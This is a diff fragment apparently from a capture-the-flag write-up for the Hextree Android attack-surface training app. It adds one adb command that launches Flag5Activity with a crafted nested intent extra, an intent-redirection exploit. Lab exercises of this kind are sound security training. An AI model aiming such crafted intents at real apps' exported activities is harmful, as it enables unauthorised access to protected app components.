@@ -152,3 +152,9 @@ startActivity(mainIntent);
 
 ```
 
+
+```
+adb shell am start -n io.hextree.attacksurface/io.hextree.attacksurface.activities.Flag5Activity \
+  --es "android.intent.extra.INTENT" "(intent#Intent;i.return=42;S.nextIntent=(intent#Intent;S.reason=back;end);end)"
+```
+
